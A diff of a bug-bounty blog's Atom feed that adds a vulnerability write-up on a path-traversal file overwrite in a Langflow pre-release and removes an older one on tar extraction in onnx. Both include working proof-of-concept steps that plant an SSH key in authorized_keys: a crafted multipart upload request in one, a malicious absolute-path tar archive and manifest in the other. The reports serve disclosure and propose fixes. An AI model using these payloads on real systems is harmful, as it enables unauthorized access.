@@ -1,4 +1,169 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-18T11:13:29+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller</title><link href="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-26T12:24:51+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release</title><link href="http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/26/remote-code-executoin-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>Pre-release version: 1.0 Alpha - v1.0.0a37</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The post <code class="language-plaintext highlighter-rouge">/upload/{flow_id}</code> endpoint in the Langflow <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">upload_file</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. The <code class="language-plaintext highlighter-rouge">filename</code> is then directly append to a directory path <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">without sanitized</a> and the file content is writen to dest location. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>
+
+<p>The vulnerable function <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34"><code class="language-plaintext highlighter-rouge">save_file</code></a>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def save_file(self, flow_id: str, file_name: str, data: bytes):
+        folder_path = self.data_dir / flow_id
+        folder_path.mkdir(parents=True, exist_ok=True)
+        file_path = folder_path / file_name
+
+        try:
+            with open(file_path, "wb") as f:
+                f.write(data)
+            logger.info(f"File {file_name} saved successfully in flow {flow_id}.")
+        except Exception as e:
+            logger.error(f"Error saving file {file_name} in flow {flow_id}: {e}")
+            raise e
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
+
+<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the langflow python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+cat: /home/kali/.ssh/authorized_keys: No such file or directory
+</code></pre></div></div>
+
+<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>We start a simple server using tutorial from <a href="https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation">https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation</a>. Note that we use pre-release versoin:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install the pre-release version
+python -m pip install langflow --pre --force-reinstall
+</code></pre></div></div>
+<p>Start web interface, the default port is <code class="language-plaintext highlighter-rouge">7860</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m langflow run
+</code></pre></div></div>
+
+<p>Then open the Langflow web interface in browser, create a new project and in the project add a file component, click the file upload button, select random text file with burpsuite intercepting the upload request. We can see the file name and file content in the multipart request body.</p>
+
+<p><img src="/assets/images/bughunter/langflow/file-component.png" alt="file-component" /></p>
+
+<p><img src="/assets/images/bughunter/langflow/file-upload.png" alt="file-upload" /></p>
+
+<p>Change the multipart <code class="language-plaintext highlighter-rouge">filename</code> to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code> and file content to our <code class="language-plaintext highlighter-rouge">authorized_keys</code> content. Repeat the upload request.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:7860/api/v1/files/upload/7e774022-0991-47f7-83a1-ef127d439755 HTTP/1.1
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
+Cache-Control: no-cache
+Connection: close
+Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
+Origin: http://127.0.0.1:7860
+Pragma: no-cache
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Host: 127.0.0.1:7860
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=--------------------------636165805457578805665550
+Content-Length: 647
+
+----------------------------636165805457578805665550
+Content-Disposition: form-data; name="file"; filename="../../../../../home/kali/.ssh/authorized_keys"
+Content-Type: application/octet-stream
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+----------------------------636165805457578805665550--
+</code></pre></div></div>
+
+<p>The response indicates success with the uploaded file path.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 201 Created
+Connection: close
+Content-Length: 146
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: http://127.0.0.1:7860
+Content-Type: application/json
+Date: Sun, 26 May 2024 03:48:37 GMT
+Server: uvicorn
+Vary: Origin
+
+{"flowId":"7e774022-0991-47f7-83a1-ef127d439755","file_path":"7e774022-0991-47f7-83a1-ef127d439755/../../../../../home/kali/.ssh/authorized_keys"}
+</code></pre></div></div>
+
+<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<h2 id="fix">Fix</h2>
+
+<p>Use <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">UUID instead of origin file name to store the file</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/upload/{flow_id}", status_code=HTTPStatus.CREATED)
+async def upload_file(
+    file: UploadFile,
+    flow_id: UUID = Depends(get_flow_id),
+    storage_service: StorageService = Depends(get_storage_service),
+):
+    try:
+        flow_id_str = str(flow_id)
+        file_content = await file.read()
+        # fix the path travesal problem
+        file_name = hashlib.sha256(file_content).hexdigest()
+        folder = flow_id_str
+        await storage_service.save_file(flow_id=folder, file_name=file_name, data=file_content)
+        return UploadFileResponse(flowId=flow_id_str, file_path=f"{folder}/{file_name}")
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h3 id="any-bounty">Any bounty</h3>
+
+<p>Can I ask for a bug bounty award or a CVE id for this bug? Thank you very much!</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>
+
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in FHIR Pipelines Controller</title><link href="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in FHIR Pipelines Controller" /><published>2024-05-16T10:31:06+08:00</published><updated>2024-05-16T10:31:06+08:00</updated><id>http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control</id><content type="html" xml:base="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Local File Inclusion in FHIR Pipelines Controller</p>
@@ -1196,178 +1361,4 @@ ssh-rsa xxx hacker@test.com
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170">https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in onnx</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in onnx" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-onnx.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Huntr: Arbitrary File Overwrite in onnx</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The <a href="https://onnx.ai/onnx/api/hub.html#download-model-with-test-data">download_model_with_test_data</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly leads to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
-
-<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function, which is further used in the onnx framework, as well as can be imported easily.</p>
-
-<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> function extracts a tar file downloaded from internet without performing any security checks.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def download_model_with_test_data(
-    model: str,
-    repo: str = "onnx/models:main", # change to attacker's repo
-    opset: Optional[int] = None,
-    force_reload: bool = False,
-    silent: bool = False, # set silent to True
-) -&gt; Optional[str]:
-    selected_model = get_model_info(model, repo, opset)
-
-    local_model_with_data_path_arr = selected_model.metadata[
-        "model_with_data_path"
-    ].split("/")
-
-    model_with_data_sha = selected_model.metadata["model_with_data_sha"]
-    ...
-    local_model_with_data_path = join(
-        _ONNX_HUB_DIR, os.sep.join(local_model_with_data_path_arr)
-    )
-
-    if force_reload or not os.path.exists(local_model_with_data_path):
-        os.makedirs(os.path.dirname(local_model_with_data_path), exist_ok=True)
-        lfs_url = _get_base_url(repo, True)
-        print(f"Downloading {model} to local path {local_model_with_data_path}")
-        _download_file( # download model from github repository
-            lfs_url + selected_model.metadata["model_with_data_path"],
-            local_model_with_data_path,
-        )
-    else:
-        print(f"Using cached {model} model from {local_model_with_data_path}")
-
-    with open(local_model_with_data_path, "rb") as f:
-        model_with_data_bytes = f.read()
-
-    with tarfile.open(local_model_with_data_path) as model_with_data_zipped:
-        # FIXME: Avoid index manipulation with magic numbers
-        local_model_with_data_dir_path = local_model_with_data_path[
-            0 : len(local_model_with_data_path) - 7
-        ]
-        model_with_data_zipped.extractall(local_model_with_data_dir_path) # just extract without any security checks
-
-    return model_with_data_path
-</code></pre></div></div>
-
-<p>The Python documentation explains us that tarfiles may also have absolute filenames starting with / which could overwite files in system.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
-It is possible that files are created outside of path, 
-e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>An attacker can create a malicous tar file using following command:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar.gz /home/kali/.ssh/authorized_keys
-</code></pre></div></div>
-
-<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> as onnx model to his own github repository. Besides, create file <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> with tar file path(<code class="language-plaintext highlighter-rouge">model_with_data_path</code>) and sha256 value(<code class="language-plaintext highlighter-rouge">model_with_data_sha</code>).</p>
-
-<p>Create malicious model repo:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git lfs track "*.gz"
-git add .
-git commit -m 'add gz lfs models'
-git push
-</code></pre></div></div>
-
-<p>the <code class="language-plaintext highlighter-rouge">ONNX_HUB_MANIFEST.json</code> metadata file example:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[
-    {
-        "model": "MNIST",
-        "model_path": "validated/mnist-8.onnx",
-        "onnx_version": "1.3",
-        "opset_version": 8,
-        "metadata": {
-            "model_sha": "",
-            "model_bytes": 26454,
-            "tags": [
-                "vision",
-                "classification",
-                "mnist"
-            ],
-            "io_ports": {
-                "inputs": [
-                    {
-                        "name": "Input3",
-                        "shape": [
-                            1,
-                            1,
-                            28,
-                            28
-                        ],
-                        "type": "tensor(float)"
-                    }
-                ],
-                "outputs": [
-                    {
-                        "name": "Plus214_Output_0",
-                        "shape": [
-                            1,
-                            10
-                        ],
-                        "type": "tensor(float)"
-                    }
-                ]
-            },
-            "model_with_data_path": "validated/hack.tar.gz",
-            "model_with_data_sha": "786bb632aab30bb574f7f2bab991c56c7707f8d224845f85a16bce32e7980cac",
-            "model_with_data_bytes": 26751
-        }
-    }
-]
-</code></pre></div></div>
-<p>I have create one malicous repo for testing: <a href="https://github.com/sunriseXu/onnx">https://github.com/sunriseXu/onnx</a></p>
-
-<p>If anyone now downloads model from online github repository, and <code class="language-plaintext highlighter-rouge">download_model_with_test_data</code> will extract the malicous tar file and overwrite files specified in tarfile by absolute path silently.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from onnx import ModelProto, hub
-hub.download_model_with_test_data("mnist",repo="sunriseXu/onnx",force_reload=True,silent=True)
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
-ssh-rsa xxx hacker@test.com
-</code></pre></div></div>
-
-<p>tested in google colab: <a href="https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing">https://colab.research.google.com/drive/1m1iJcfp-dETTr013HyYaYJsdetBa-7YA?usp=sharing</a></p>
-
-<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc.png" alt="poc1" /></p>
-
-<p><img src="https://raw.githubusercontent.com/sunriseXu/onnx/main/img/poc2.png" alt="poc2" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
-
-<p>SSH Access
-On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
-
-<p>Web Servers
-On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369">https://github.com/onnx/onnx/blob/4128a09009aa67622c6308c82fe4199813a71682/onnx/hub.py#L369</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170">https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
